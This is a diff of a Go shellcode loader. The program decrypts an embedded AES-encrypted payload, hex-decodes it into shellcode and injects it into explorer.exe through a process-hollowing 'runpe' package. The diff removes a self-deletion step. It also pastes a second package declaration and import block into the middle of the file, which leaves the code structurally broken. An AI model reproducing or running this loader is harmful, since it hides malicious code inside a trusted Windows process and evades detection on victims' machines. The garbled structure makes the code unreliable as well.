@@ -15,18 +15,33 @@ var k string
 //go:embed pe.txt
 var s string
 
+package main
+
+import (
+	"crypto/aes"
+	"crypto/cipher"
+	_ "embed"
+	"encoding/hex"
+	"github.com/Enelg52/Backpack/runpe"
+)
+
+//https://pkg.go.dev/embed
+//go:embed key.txt
+var k string
+
+//go:embed pe.txt
+var s string
+
 func main() {
 	key := []byte(k)
 	src := "C:\\Windows\\explorer.exe"
+	//change the console value to false if you don't want a new window
 	console := true
 	payload, _ := decrypt([]byte(s), key)
 	shellcode, err := hex.DecodeString(string(payload))
+
 	runpe.CheckErr(err)
 	runpe.Inject(src, shellcode, console)
-
-	// Self-deletion after execution
-	err = os.Remove(os.Args[0])
-	runpe.CheckErr(err)
 }
 
 func decrypt(cypherText []byte, key []byte) ([]byte, error) {
